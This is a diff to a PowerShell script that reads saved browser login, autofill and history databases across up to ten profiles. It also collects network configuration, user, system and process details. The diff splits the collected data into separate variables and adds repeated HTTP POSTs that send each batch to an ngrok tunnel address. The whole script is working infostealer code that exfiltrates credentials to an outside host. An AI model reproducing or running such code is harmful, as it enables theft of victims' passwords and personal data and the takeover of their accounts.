@@ -12,65 +12,65 @@ $var += Get-Content "History"
 
     # if more than 1 profile try this
 
-$var += cat -Path "Profile 1\Login Data"
+$var1 += cat -Path "Profile 1\Login Data"
 
-$var += cat -Path "Profile 1\Web Data"
+$var2 += cat -Path "Profile 1\Web Data"
 
-$var += cat -Path "Profile 1\History"
+$var3 += cat -Path "Profile 1\History"
 
-$var += cat -Path "Profile 2\Login Data"
+$var1 += cat -Path "Profile 2\Login Data"
 
-$var += cat -Path "Profile 2\Web Data"
+$var2 += cat -Path "Profile 2\Web Data"
 
-$var += cat -Path "Profile 2\History"
+$var3 += cat -Path "Profile 2\History"
 
-$var += cat -Path "Profile 3\Login Data"
+$var1 += cat -Path "Profile 3\Login Data"
 
-$var += cat -Path "Profile 3\Web Data"
+$var2 += cat -Path "Profile 3\Web Data"
 
-$var += cat -Path "Profile 4\History"
+$var3 += cat -Path "Profile 4\History"
 
-$var += cat -Path "Profile 4\Login Data"
+$var1 += cat -Path "Profile 4\Login Data"
 
-$var += cat -Path "Profile 4 \Web Data"
+$var2 += cat -Path "Profile 4 \Web Data"
 
-$var += cat -Path "Profile 4\History"
+$var3 += cat -Path "Profile 4\History"
 
-$var += cat -Path "Profile 5\Login Data"
+$var1 += cat -Path "Profile 5\Login Data"
 
-$var += cat -Path "Profile 5\Web Data"
+$var2 += cat -Path "Profile 5\Web Data"
 
-$var += cat -Path "Profile 5\History"
+$var3 += cat -Path "Profile 5\History"
 
-$var += cat -Path "Profile 6\Login Data"
+$var1 += cat -Path "Profile 6\Login Data"
 
-$var += cat -Path "Profile 6\Web Data"
+$var2 += cat -Path "Profile 6\Web Data"
 
 $var += cat -Path "Profile 6\History"
 
-$var += cat -Path "Profile 7\Login Data"
+$var1 += cat -Path "Profile 7\Login Data"
 
-$var += cat -Path "Profile 7\Web Data"
+$var2 += cat -Path "Profile 7\Web Data"
 
-$var += cat -Path "Profile 7\History"
+$var3 += cat -Path "Profile 7\History"
 
-$var += cat -Path "Profile 8\Login Data"
+$var1 += cat -Path "Profile 8\Login Data"
 
-$var += cat -Path "Profile 8\Web Data"
+$var2 += cat -Path "Profile 8\Web Data"
 
-$var += cat -Path "Profile 8\History"
+$var3 += cat -Path "Profile 8\History"
 
-$var += cat -Path "Profile 9\Login Data"
+$var1 += cat -Path "Profile 9\Login Data"
 
-$var += cat -Path "Profile 9\Web Data"
+$var2 += cat -Path "Profile 9\Web Data"
 
-$var += cat -Path "Profile 9\History"
+$var3 += cat -Path "Profile 9\History"
 
-$var += cat -Path "Profile 10\Login Data"
+$var1 += cat -Path "Profile 10\Login Data"
 
-$var += cat -Path "Profile 10\Web Data"
+$var2 += cat -Path "Profile 10\Web Data"
 
-$var += cat -Path "Profile 10\History"
+$var3 += cat -Path "Profile 10\History"
 
 
 
@@ -138,15 +138,15 @@ start-sleep 4
 
 
 
-$var += Get-NetIPConfiguration 
+$var4 += Get-NetIPConfiguration 
 
-$var += whoami
+$var4 += whoami
 
-$var += Get-ComputerInfo
+$var4 += Get-ComputerInfo
 
-$var += Get-Date
+$var4 += Get-Date
 
-$var += ps 
+$var4 += ps 
 
 Start-Sleep -Seconds 3
 
@@ -155,6 +155,17 @@ Start-Sleep -Seconds 3
 #httpsend
 
     $Response = Invoke-WebRequest -Method Post -URI https://9280-70-31-164-93.ngrok-free.app -body $var -UseBasicParsing
+    
+    $Response = Invoke-WebRequest -Method Post -URI https://9280-70-31-164-93.ngrok-free.app -body $var1 -UseBasicParsing
+
+    $Response = Invoke-WebRequest -Method Post -URI https://9280-70-31-164-93.ngrok-free.app -body $var2 -UseBasicParsing
+
+    $Response = Invoke-WebRequest -Method Post -URI https://9280-70-31-164-93.ngrok-free.app -body $var3 -UseBasicParsing
+
+    $Response = Invoke-WebRequest -Method Post -URI https://9280-70-31-164-93.ngrok-free.app -body $var4 -UseBasicParsing
+
+
+
 
 #set per
 
